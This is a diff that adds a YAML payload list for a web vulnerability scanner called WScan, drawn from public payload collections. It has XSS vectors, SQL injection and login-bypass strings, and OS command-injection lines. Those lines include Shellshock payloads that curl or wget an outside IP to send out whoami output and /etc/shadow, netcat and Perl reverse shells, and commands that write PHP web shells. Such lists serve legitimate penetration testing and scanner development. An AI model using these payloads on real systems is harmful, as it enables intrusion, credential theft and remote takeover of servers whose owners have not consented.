@@ -1,0 +1,1960 @@
+# WScan Community Payloads
+# 取得日時 (UTC): 2026-06-07T16:56:42+00:00
+# 出典:
+# - https://github.com/swisskyrepo/PayloadsAllTheThings
+# - https://github.com/danielmiessler/SecLists
+# 各上流リポジトリの LICENSE に従って利用してください。
+xss:
+- jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+- ''';alert(String.fromCharCode(88,83,83))//'';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">''><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>'
+- “ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+- '''">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex
+  formaction=javascript:alert(/XSS/) type=submit>''-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>''"><img
+  src="http://i.imgur.com/P8mL8.jpg">'
+- javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+- javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+- javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+- javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+- javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+- javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+- javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+- --></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+- /</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+- javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+- /</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+- JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
+- <script>alert('XSS')</script>
+- <scr<script>ipt>alert('XSS')</scr<script>ipt>
+- '"><script>alert(''XSS'')</script>'
+- '"><script>alert(String.fromCharCode(88,83,83))</script>'
+- <img src=x onerror=alert('XSS');>
+- <img src=x onerror=alert(String.fromCharCode(88,83,83));>
+- <img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+- <img src=x:alert(alt) onerror=eval(src) alt=xss>
+- '"><img src=x onerror=alert(''XSS'');>'
+- '"><img src=x onerror=alert(String.fromCharCode(88,83,83));>'
+- <svg
+- onload=alert(1)>
+- <svg/onload=alert('XSS')>
+- <svg/onload=alert(String.fromCharCode(88,83,83))>
+- <svg id=alert(1) onload=eval(id)>
+- '"><svg/onload=alert(String.fromCharCode(88,83,83))>'
+- '"><svg/onload=alert(/XSS/)'
+- <body onload=alert(/XSS/.source)>
+- <input autofocus onfocus=alert(1)>
+- <select autofocus onfocus=alert(1)>
+- <textarea autofocus onfocus=alert(1)>
+- <keygen autofocus onfocus=alert(1)>
+- <video/poster/onerror=alert(1)>
+- <video><source onerror="javascript:alert(1)">
+- <video src=_ onloadstart="alert(1)">
+- <details/open/ontoggle="alert`1`">
+- <audio src onloadstart=alert(1)>
+- <marquee onstart=alert(1)>
+- <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+- <meta/content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg=="http-equiv=refresh>
+- data:text/html,<script>alert(0)</script>
+- data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
+- jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+- '">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1)
+  ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/)
+  type=submit>''-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>''"><img
+  src="http: //i.imgur.com/P8mL8.jpg">'
+- '" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//'
+- ''';alert(String.fromCharCode(88,83,83))//'';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode
+  (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">''><SCRIPT>alert(String.fromCharCode(88,83,83))
+  </SCRIPT>'
+- <object onafterscriptexecute=confirm(0)>
+- <object onbeforescriptexecute=confirm(0)>
+- <script>window['alert'](document['domain'])<script>
+- <img src='1' onerror/=alert(0) />
+- <script>window['alert'](0)</script>
+- <script>parent['alert'](1)</script>
+- <script>self['alert'](2)</script>
+- <script>top['alert'](3)</script>
+- '"><svg onload=alert(1)//'
+- '"onmouseover=alert(1)//'
+- '"autofocus/onfocus=alert(1)//'
+- '''-alert(1)-'''
+- '''-alert(1)//'
+- \'-alert(1)//
+- </script><svg onload=alert(1)>
+- <x contenteditable onblur=alert(1)>lose focus!
+- <x onclick=alert(1)>click this!
+- <x oncopy=alert(1)>copy this!
+- <x oncontextmenu=alert(1)>right click this!
+- <x oncut=alert(1)>cut this!
+- <x ondblclick=alert(1)>double click this!
+- <x ondrag=alert(1)>drag this!
+- <x contenteditable onfocus=alert(1)>focus this!
+- <x contenteditable oninput=alert(1)>input here!
+- <x contenteditable onkeydown=alert(1)>press any key!
+- <x contenteditable onkeypress=alert(1)>press any key!
+- <x contenteditable onkeyup=alert(1)>press any key!
+- <x onmousedown=alert(1)>click this!
+- <x onmousemove=alert(1)>hover this!
+- <x onmouseout=alert(1)>hover this!
+- <x onmouseover=alert(1)>hover this!
+- <x onmouseup=alert(1)>click this!
+- <x contenteditable onpaste=alert(1)>paste here!
+- <script>alert(1)//
+- <script>alert(1)<!–
+- <script src=//brutelogic.com.br/1.js>
+- <script src=//3334957647/1>
+- '%3Cx onxxx=alert(1)'
+- <%78 onxxx=1
+- <x %6Fnxxx=1
+- <x o%6Exxx=1
+- <x on%78xx=1
+- <x onxxx%3D1
+- <X onxxx=1
+- <x OnXxx=1
+- <X OnXxx=1
+- <x onxxx=1 onxxx=1
+- <x/onxxx=1
+- <x%09onxxx=1
+- <x%0Aonxxx=1
+- <x%0Conxxx=1
+- <x%0Donxxx=1
+- <x%2Fonxxx=1
+- <x 1='1'onxxx=1
+- <x 1="1"onxxx=1
+- <x </onxxx=1
+- <x 1=">" onxxx=1
+- <http://onxxx%3D1/
+- <x onxxx=alert(1) 1='
+- <svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
+- '''onload=alert(1)><svg/1='''
+- '''>alert(1)</script><script/1='''
+- '*/alert(1)</script><script>/*'
+- '*/alert(1)">''onload="/*<svg/1='''
+- '`-alert(1)">''onload="`<svg/1='''
+- '*/</script>''>alert(1)/*<script/1='''
+- <script>alert(1)</script>
+- <script src=javascript:alert(1)>
+- <iframe src=javascript:alert(1)>
+- <embed src=javascript:alert(1)>
+- <a href=javascript:alert(1)>click
+- <math><brute href=javascript:alert(1)>click
+- <form action=javascript:alert(1)><input type=submit>
+- <isindex action=javascript:alert(1) type=submit value=click>
+- <form><button formaction=javascript:alert(1)>click
+- <form><input formaction=javascript:alert(1) type=submit value=click>
+- <form><input formaction=javascript:alert(1) type=image value=click>
+- <form><input formaction=javascript:alert(1) type=image src=SOURCE>
+- <isindex formaction=javascript:alert(1) type=submit value=click>
+- <object data=javascript:alert(1)>
+- <iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
+- <svg><script xlink:href=data:,alert(1) />
+- <math><brute xlink:href=javascript:alert(1)>click
+- <svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate
+  attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
+- <html ontouchstart=alert(1)>
+- <html ontouchend=alert(1)>
+- <html ontouchmove=alert(1)>
+- <html ontouchcancel=alert(1)>
+- <body onorientationchange=alert(1)>
+- '"><img src=1 onerror=alert(1)>.gif'
+- <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+- GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
+- <script src="data:&comma;alert(1)//
+- '"><script src=data:&comma;alert(1)//'
+- <script src="//brutelogic.com.br&sol;1.js&num;
+- '"><script src=//brutelogic.com.br&sol;1.js&num;'
+- <link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+- '"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;'
+- <base href=//0>
+- <script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)
+- <body onload=alert(1)>
+- <body onpageshow=alert(1)>
+- <body onfocus=alert(1)>
+- <body onhashchange=alert(1)><a href=#x>click this!#x
+- <body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
+- <body onscroll=alert(1)><br><br><br><br>
+- <body onresize=alert(1)>press F12!
+- <body onhelp=alert(1)>press F1! (MSIE)
+- <marquee loop=1 width=0 onfinish=alert(1)>
+- <video onloadstart=alert(1)><source>
+- <input autofocus onblur=alert(1)>
+- <form onsubmit=alert(1)><input type=submit>
+- <select onchange=alert(1)><option>1<option>2
+- <menu id=x contextmenu=x onshow=alert(1)>right click me!
+- <script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+- <img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
+- <iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
+- <script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
+- <img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
+- <script>$=1,alert($)</script>
+- <script ~~~>confirm(1)</script ~~~>
+- <script>$=1,\u0061lert($)</script>
+- <</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
+- <</script/script><script ~~~>\u0061lert(1)</script ~~~>
+- </style></scRipt><scRipt>alert(1)</scRipt>
+- <img/id="alert&lpar;&#x27;XSS&#x27;&#x29;\"/alt=\"/\"src=\"/\"onerror=eval(id&#x29;>
+- <img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
+- <svg><x><script>alert&#40;&#39;1&#39;&#41</x>
+- <iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
+- javascript:alert(1)//INJECTX
+- <svg/onload=alert(1)>//INJECTX
+- <img onload=alert(1)>//INJECTX
+- <img src=x onerror=prompt(1)>//INJECTX
+- <a href="javascript:alert(1)" onmouseover=alert(1)>INJECTX HOVER</a>
+- onmouseover="document.cookie=true;">//INJECTX
+- alert(1)>//INJECTX
+- <h1>INJECTX</h1>
+- <img src=x onload=prompt(1) onerror=alert(1) onmouseover=prompt(1)>
+- <svg><script>/<@/>alert(1)</script>//INJECTX
+- <svg/onload=alert(/INJECTX/)>
+- <iframe/onload=alert(/INJECTX/)>
+- <svg/onload=alert`INJECTX`>
+- <svg/onload=alert(`INJECTX`)>
+- '}alert(/INJECTX/);{//'
+- <h1/onclick=alert(1)>a//INJECTX
+- <p/onclick=alert(/INJECTX/)>a
+- <video><source onerror="javascript:alert(1)">//INJECTX
+- <video onerror="javascript:alert(1)"><source>//INJECTX
+- <audio onerror="javascript:alert(1)"><source>//INJECTX
+- <input autofocus onfocus=alert(1)>//INJECTX
+- <select autofocus onfocus=alert(1)>//INJECTX
+- <textarea autofocus onfocus=alert(1)>//INJECTX
+- <keygen autofocus onfocus=alert(1)>//INJECTX
+- <button form=test onformchange=alert(1)>//INJECTX
+- <form><button formaction="javascript:alert(1)">//INJECTX
+- <svg onload=(alert)(1) >//INJECTX
+- <script>$=1,alert($)</script>//INJECTX
+- <!--<img src="--><img src=x onerror=alert(1)//">//INJECTX
+- <img/src='x'onerror=alert(1)>//INJECTX
+- <marguee/onstart=alert(1)>//INJECTX
+- <script>alert(1)//INJECTX
+- <script>alert(1)<!--INJECTX
+- <marquee loop=1 width=0 onfinish=alert(1)>//INJECTX
+sqli:
+- '1'
+- 1'
+- 1"
+- '[1]'
+- 1`
+- 1\
+- 1/*'*/
+- 1/*!1111'*/
+- 1'||'asd'||'
+- 1' or '1'='1
+- 1 or 1=1
+- '''or''''='''
+- OR 1=1
+- OR 1=0
+- OR x=x
+- OR x=y
+- OR 1=1#
+- OR 1=0#
+- OR x=x#
+- OR x=y#
+- OR 1=1--
+- OR 1=0--
+- OR x=x--
+- OR x=y--
+- OR 3409=3409 AND ('pytW' LIKE 'pytW
+- OR 3409=3409 AND ('pytW' LIKE 'pytY
+- HAVING 1=1
+- HAVING 1=0
+- HAVING 1=1#
+- HAVING 1=0#
+- HAVING 1=1--
+- HAVING 1=0--
+- AND 1=1
+- AND 1=0
+- AND 1=1--
+- AND 1=0--
+- AND 1=1#
+- AND 1=0#
+- AND 1=1 AND '%'='
+- AND 1=0 AND '%'='
+- AND 1083=1083 AND (1427=1427
+- AND 7506=9091 AND (5913=5913
+- AND 1083=1083 AND ('1427=1427
+- AND 7506=9091 AND ('5913=5913
+- AND 7300=7300 AND 'pKlZ'='pKlZ
+- AND 7300=7300 AND 'pKlZ'='pKlY
+- AND 7300=7300 AND ('pKlZ'='pKlZ
+- AND 7300=7300 AND ('pKlZ'='pKlY
+- AS INJECTX WHERE 1=1 AND 1=1
+- AS INJECTX WHERE 1=1 AND 1=0
+- AS INJECTX WHERE 1=1 AND 1=1#
+- AS INJECTX WHERE 1=1 AND 1=0#
+- AS INJECTX WHERE 1=1 AND 1=1--
+- AS INJECTX WHERE 1=1 AND 1=0--
+- WHERE 1=1 AND 1=1
+- WHERE 1=1 AND 1=0
+- WHERE 1=1 AND 1=1#
+- WHERE 1=1 AND 1=0#
+- WHERE 1=1 AND 1=1--
+- WHERE 1=1 AND 1=0--
+- ORDER BY 1--
+- ORDER BY 2--
+- ORDER BY 3--
+- ORDER BY 4--
+- ORDER BY 5--
+- ORDER BY 6--
+- ORDER BY 7--
+- ORDER BY 8--
+- ORDER BY 9--
+- ORDER BY 10--
+- ORDER BY 11--
+- ORDER BY 12--
+- ORDER BY 13--
+- ORDER BY 14--
+- ORDER BY 15--
+- ORDER BY 16--
+- ORDER BY 17--
+- ORDER BY 18--
+- ORDER BY 19--
+- ORDER BY 20--
+- ORDER BY 21--
+- ORDER BY 22--
+- ORDER BY 23--
+- ORDER BY 24--
+- ORDER BY 25--
+- ORDER BY 26--
+- ORDER BY 27--
+- ORDER BY 28--
+- ORDER BY 29--
+- ORDER BY 30--
+- ORDER BY 31337--
+- ORDER BY 1#
+- ORDER BY 2#
+- ORDER BY 3#
+- ORDER BY 4#
+- ORDER BY 5#
+- ORDER BY 6#
+- ORDER BY 7#
+- ORDER BY 8#
+- ORDER BY 9#
+- ORDER BY 10#
+- ORDER BY 11#
+- ORDER BY 12#
+- ORDER BY 13#
+- ORDER BY 14#
+- ORDER BY 15#
+- ORDER BY 16#
+- ORDER BY 17#
+- ORDER BY 18#
+- ORDER BY 19#
+- ORDER BY 20#
+- ORDER BY 21#
+- ORDER BY 22#
+- ORDER BY 23#
+- ORDER BY 24#
+- ORDER BY 25#
+- ORDER BY 26#
+- ORDER BY 27#
+- ORDER BY 28#
+- ORDER BY 29#
+- ORDER BY 30#
+- ORDER BY 31337#
+- ORDER BY 1
+- ORDER BY 2
+- ORDER BY 3
+- ORDER BY 4
+- ORDER BY 5
+- ORDER BY 6
+- ORDER BY 7
+- ORDER BY 8
+- ORDER BY 9
+- ORDER BY 10
+- ORDER BY 11
+- ORDER BY 12
+- ORDER BY 13
+- ORDER BY 14
+- ORDER BY 15
+- ORDER BY 16
+- ORDER BY 17
+- ORDER BY 18
+- ORDER BY 19
+- ORDER BY 20
+- ORDER BY 21
+- ORDER BY 22
+- ORDER BY 23
+- ORDER BY 24
+- ORDER BY 25
+- ORDER BY 26
+- ORDER BY 27
+- ORDER BY 28
+- ORDER BY 29
+- ORDER BY 30
+- ORDER BY 31337
+- RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+- RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+- IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
+- IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
+- '%'' AND 8310=8310 AND ''%''='''
+- '%'' AND 8310=8311 AND ''%''='''
+- and (select substring(@@version,1,1))='X'
+- and (select substring(@@version,1,1))='M'
+- and (select substring(@@version,2,1))='i'
+- and (select substring(@@version,2,1))='y'
+- and (select substring(@@version,3,1))='c'
+- and (select substring(@@version,3,1))='S'
+- and (select substring(@@version,3,1))='X'
+- '''-'''
+- ''' '''
+- '''&'''
+- '''^'''
+- '''*'''
+- ''' or ''''-'''
+- ''' or '''' '''
+- ''' or ''''&'''
+- ''' or ''''^'''
+- ''' or ''''*'''
+- '"-"'
+- '" "'
+- '"&"'
+- '"^"'
+- '"*"'
+- '" or ""-"'
+- '" or "" "'
+- '" or ""&"'
+- '" or ""^"'
+- '" or ""*"'
+- or true--
+- '" or true--'
+- ''' or true--'
+- '") or true--'
+- ''') or true--'
+- ''' or ''x''=''x'
+- ''') or (''x'')=(''x'
+- ''')) or ((''x''))=((''x'
+- '" or "x"="x'
+- '") or ("x")=("x'
+- '")) or (("x"))=(("x'
+- or 1=1
+- or 1=1--
+- or 1=1#
+- or 1=1/*
+- admin' --
+- 'admin'' #'
+- admin'/*
+- admin' or '1'='1
+- admin' or '1'='1'--
+- admin' or '1'='1'#
+- admin' or '1'='1'/*
+- admin'or 1=1 or ''='
+- admin' or 1=1
+- admin' or 1=1--
+- admin' or 1=1#
+- admin' or 1=1/*
+- admin') or ('1'='1
+- admin') or ('1'='1'--
+- admin') or ('1'='1'#
+- admin') or ('1'='1'/*
+- admin') or '1'='1
+- admin') or '1'='1'--
+- admin') or '1'='1'#
+- admin') or '1'='1'/*
+- 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+- admin" --
+- 'admin" #'
+- admin"/*
+- admin" or "1"="1
+- admin" or "1"="1"--
+- admin" or "1"="1"#
+- admin" or "1"="1"/*
+- admin"or 1=1 or ""="
+- admin" or 1=1
+- admin" or 1=1--
+- admin" or 1=1#
+- admin" or 1=1/*
+- admin") or ("1"="1
+- admin") or ("1"="1"--
+- admin") or ("1"="1"#
+- admin") or ("1"="1"/*
+- admin") or "1"="1
+- admin") or "1"="1"--
+- admin") or "1"="1"#
+- admin") or "1"="1"/*
+- 1' or 1.e(1) or '1'='1
+- 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+- SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/
+- SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR"*/
+  FROM some_table WHERE ex = ample
+os:
+- '`'
+- '||'
+- '|'
+- ;
+- ''''
+- '''"'
+- '"'
+- '"'''
+- '&'
+- '&&'
+- '%0a'
+- '%0a%0d'
+- '%0Acat%20/etc/passwd'
+- '%0Aid'
+- '%0a id %0a'
+- '%0Aid%0A'
+- '%0a ping -i 30 127.0.0.1 %0a'
+- '%0A/usr/bin/id'
+- '%0A/usr/bin/id%0A'
+- '%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #'' |ping -n 21 127.0.0.1||`ping -c
+  21 127.0.0.1` #\" |ping -n 21 127.0.0.1'
+- '%20{${phpinfo()}}'
+- '%20{${sleep(20)}}'
+- '%20{${sleep(3)}}'
+- a|id|
+- a;id|
+- a;id;
+- a;id\n
+- () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
+- () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
+- () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep
+  root /etc/shadow\`"
+- () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname
+  -a\`"
+- () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc
+  -lvvp 1234 -e /bin/bash\`"
+- () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc
+  -lvvp 1236 -e /bin/bash &\`"
+- () { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=5"
+- () { :;}; /bin/bash -c "sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6"
+- () { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"
+- () { :;}; /bin/bash -c "sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7"
+- () { :;}; /bin/bash -c "sleep 3 && echo vulnerable 3"
+- () { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8"
+- () { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9"
+- () { :;}; /bin/bash -c "sleep 6 && echo vulnerable 6"
+- () { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`"
+- () { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`"
+- () { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep
+  root /etc/shadow\`"
+- () { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname
+  -a\`"
+- () { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc
+  -lvvp 1235 -e /bin/bash\`"
+- () { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc
+  -lvvp 1237 -e /bin/bash &\`"
+- () { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=4"
+- cat /etc/hosts
+- $(`cat /etc/passwd`)
+- cat /etc/passwd
+- () { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12
+- '| curl http://crowdshield.com/.testing/rce.txt'
+- '& curl http://crowdshield.com/.testing/rce.txt'
+- ; curl https://crowdshield.com/.testing/rce_vuln.txt
+- '&& curl https://crowdshield.com/.testing/rce_vuln.txt'
+- curl https://crowdshield.com/.testing/rce_vuln.txt
+- 'curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt`
+  #'' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt`
+  #\" |curl https://crowdshield.com/.testing/rce_vuln.txt'
+- $(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
+- dir
+- '| dir'
+- ; dir
+- $(`dir`)
+- '& dir'
+- '&&dir'
+- '&& dir'
+- '| dir C:\'
+- ; dir C:\
+- '& dir C:\'
+- '&& dir C:\'
+- dir C:\
+- '| dir C:\Documents and Settings\*'
+- ; dir C:\Documents and Settings\*
+- '& dir C:\Documents and Settings\*'
+- '&& dir C:\Documents and Settings\*'
+- dir C:\Documents and Settings\*
+- '| dir C:\Users'
+- ; dir C:\Users
+- '& dir C:\Users'
+- '&& dir C:\Users'
+- dir C:\Users
+- ;echo%20'<script>alert(1)</script>'
+- echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'//
+  XXXXXXXXXXX
+- '| echo "<?php include($_GET[''page''])| ?>" > rfi.php'
+- ; echo "<?php include($_GET['page']); ?>" > rfi.php
+- '& echo "<?php include($_GET[''page'']); ?>" > rfi.php'
+- '&& echo "<?php include($_GET[''page'']); ?>" > rfi.php'
+- echo "<?php include($_GET['page']); ?>" > rfi.php
+- '| echo "<?php system(''dir $_GET[''dir'']'')| ?>" > dir.php'
+- ; echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
+- '& echo "<?php system(''dir $_GET[''dir'']''); ?>" > dir.php'
+- '&& echo "<?php system(''dir $_GET[''dir'']''); ?>" > dir.php'
+- echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
+- '| echo "<?php system($_GET[''cmd''])| ?>" > cmd.php'
+- ; echo "<?php system($_GET['cmd']); ?>" > cmd.php
+- '& echo "<?php system($_GET[''cmd'']); ?>" > cmd.php'
+- '&& echo "<?php system($_GET[''cmd'']); ?>" > cmd.php'
+- echo "<?php system($_GET['cmd']); ?>" > cmd.php
+- ;echo '<script>alert(1)</script>'
+- echo '<script>alert(1)</script>'// XXXXXXXXXXX
+- echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX
+- '| echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh
+  -i");};" > rev.pl'
+- ; echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh
+  -i");};" > rev.pl
+- '& echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh
+  -i");};" > rev.pl'
+- '&& echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh
+  -i");};" > rev.pl'
+- echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh
+  -i");};" > rev.pl
+- () { :;}; echo vulnerable 10
+- eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX